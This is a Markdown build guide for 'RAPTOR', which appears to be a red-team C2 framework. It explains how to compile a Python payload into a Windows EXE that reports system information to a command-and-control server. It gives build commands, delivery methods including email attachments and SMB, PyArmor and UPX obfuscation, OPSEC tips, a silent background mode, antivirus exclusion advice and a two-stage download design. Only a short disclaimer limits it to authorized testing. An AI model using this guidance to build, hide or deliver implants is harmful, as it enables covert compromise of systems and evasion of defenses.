# RAPTOR Payload EXE Build Guide

This guide explains how to convert `payload_cloud.py` into a standalone Windows executable (`.exe`) that includes all dependencies.

## 🎯 Why Build an EXE?

- **No Python Required**: Target systems don't need Python installed
- **Self-Contained**: All libraries bundled into a single file
- **Professional Demo**: Looks more like real malware in demonstrations
- **Easy Distribution**: Just copy one file to target system

---

## 📋 Prerequisites

### On Linux (Build System):

1. **Python 3.x** with pip
2. **PyInstaller**: Will be auto-installed by build script
3. **Wine** (optional): To test the EXE on Linux

```bash
# Install Wine (optional, for testing on Linux)
sudo apt-get update
sudo apt-get install wine wine64
```

### On Windows (Build System):

1. **Python 3.x** with pip
2. **PyInstaller**: Will be auto-installed by build script

---

## 🔨 Building the EXE

### Method 1: Using the Build Script (Recommended)

```bash
# From the project root directory
./build_payload.sh
```

**Output**: `dist/raptor_payload.exe`

### Method 2: Using the Spec File (Advanced)

```bash
# From the project root directory
pip install pyinstaller
pyinstaller payload.spec
```

**Output**: `dist/raptor_payload.exe`

### Method 3: Manual PyInstaller Command

```bash
cd src/core
pyinstaller \
    --onefile \
    --name raptor_payload \
    --hidden-import=psutil \
    --hidden-import=requests \
    payload_cloud.py
```

**Output**: `dist/raptor_payload.exe`

---

## 📦 What Gets Bundled?

The EXE includes:

- ✅ `payload_cloud.py` code
- ✅ `psutil` library (system info collection)
- ✅ `requests` library (HTTP communication)
- ✅ `urllib3`, `certifi`, `charset_normalizer` (HTTP dependencies)
- ✅ Python interpreter
- ✅ All standard library modules

**File Size**: ~10-15 MB (compressed with UPX)

---

## 🚀 Using the EXE

### On Windows Target System:

```cmd
# Basic usage
raptor_payload.exe http://your-c2-server:8000

# Example
raptor_payload.exe http://192.168.1.100:8000
```

### On Linux (with Wine):

```bash
wine dist/raptor_payload.exe http://localhost:8000
```

### Command-Line Arguments:

The EXE accepts the same arguments as the Python script:

```bash
raptor_payload.exe <c2_server_url>
```

- `c2_server_url`: Full URL to your C2 server (e.g., `http://10.0.0.1:8000`)

---

## 🎭 Demo Workflow

### 1. Build the Payload

```bash
./build_payload.sh
```

### 2. Start the C2 Server

```bash
cd src/c2
python manage.py runserver 0.0.0.0:8000
```

### 3. Transfer EXE to Target

```bash
# Via HTTP
python3 -m http.server 8080
# Then download on target: http://<your-ip>:8080/dist/raptor_payload.exe

# Via SMB share
# Via USB drive
# Via email attachment (for demos only!)
```

### 4. Execute on Target

```cmd
# On Windows target
raptor_payload.exe http://<c2-server-ip>:8000
```

### 5. Monitor C2 Dashboard

- Watch real-time data coming in
- View reconnaissance results
- Check AI attack decisions
- Generate PDF report

---

## 🔧 Troubleshooting

### Build Issues

**Problem**: `ModuleNotFoundError` during build
```bash
# Solution: Add the missing module to hiddenimports
pyinstaller --hidden-import=<module_name> payload_cloud.py
```

**Problem**: `ImportError: DLL load failed` when running EXE
```bash
# Solution: Build on the same OS as target (Windows EXE on Windows)
```

**Problem**: Large file size (>30 MB)
```bash
# Solution: Use UPX compression (already enabled in payload.spec)
# Or exclude unused modules in the spec file
```

### Runtime Issues

**Problem**: EXE crashes immediately
```bash
# Solution: Run with console mode enabled to see errors
# Edit payload.spec: console=True
```

**Problem**: Antivirus flags the EXE
```bash
# Solution: This is expected for any payload executable
# Add exclusion in AV settings (for legitimate red team testing only!)
```

**Problem**: Network connection fails
```bash
# Solution: Check firewall rules on target
# Ensure C2 server is reachable: ping <c2-server-ip>
```

---

## 🛡️ Security Considerations

### Obfuscation (Optional)

To make the EXE harder to reverse-engineer:

1. **PyArmor**: Obfuscate Python bytecode
   ```bash
   pip install pyarmor
   pyarmor obfuscate src/core/payload_cloud.py
   pyinstaller --onefile dist/payload_cloud.py
   ```

2. **UPX Packing**: Already enabled in `payload.spec`

3. **String Encryption**: Manually encrypt sensitive strings in code

### OPSEC Tips

- ✅ Build on a clean VM
- ✅ Don't include debug symbols
- ✅ Use generic names (not "raptor_payload.exe")
- ✅ Test on isolated network first
- ✅ Get proper authorization before deployment

---

## 📊 File Size Optimization

### Current Size: ~10-15 MB

To reduce size:

1. **Exclude unused modules** in `payload.spec`:
   ```python
   excludes=[
       'matplotlib', 'numpy', 'pandas', 'scipy',
       'PIL', 'tkinter', 'IPython', 'notebook',
   ]
   ```

2. **Enable UPX compression**:
   ```python
   upx=True,  # Already enabled
   ```

3. **Strip debug symbols**:
   ```python
   strip=True,  # Can be enabled for smaller size
   ```

4. **Two-stage payload**: Make EXE download main payload at runtime
   - Reduces initial size to <1 MB
   - More flexible for updates

---

## 🔄 Cross-Platform Building

### Building Windows EXE on Linux:

**Not directly supported** - PyInstaller must build on target OS.

**Workaround**:
1. Use a Windows VM on Linux
2. Install Python + PyInstaller in Windows VM
3. Build there and copy EXE out

**Alternative**: Use Docker with Windows container (complex)

---

## 📝 Build Variants

### Variant 1: Console Mode (Default)
- Shows output window
- Good for debugging/demos
- `console=True` in spec file

### Variant 2: Windowed Mode (Silent)
- No console window
- Runs in background
- `console=False` in spec file

### Variant 3: Service Mode
- Runs as Windows service
- Auto-starts on boot
- Requires additional code (not implemented)

---

## 🧪 Testing the EXE

### Test 1: Basic Execution
```cmd
raptor_payload.exe http://localhost:8000
```
**Expected**: Connects to C2, sends system info

### Test 2: Network Connectivity
```cmd
# Check if C2 is reachable
curl http://localhost:8000/scans/callback/
```

### Test 3: Dependencies Check
```cmd
# Run in Wine with debug output
WINEDEBUG=+all wine raptor_payload.exe http://localhost:8000
```

---

## 📚 Additional Resources

- [PyInstaller Documentation](https://pyinstaller.org/)
- [UPX Compressor](https://upx.github.io/)
- [PyArmor Obfuscator](https://pyarmor.dashingsoft.com/)
- [Wine for Linux Testing](https://www.winehq.org/)

---

## 🤝 Support

Having issues? Check:

1. **Build logs**: Look in `build/temp/` directory
2. **Runtime errors**: Enable console mode in spec file
3. **Dependencies**: Ensure all imports are in `hiddenimports`
4. **Permissions**: Run as administrator if needed

---

## ⚠️ Legal Disclaimer

This tool is for **authorized security testing only**. Unauthorized deployment of payloads is illegal. Always obtain written permission before red team operations.

---

**Last Updated**: November 2025  
**Maintainer**: RAPTOR Development Team
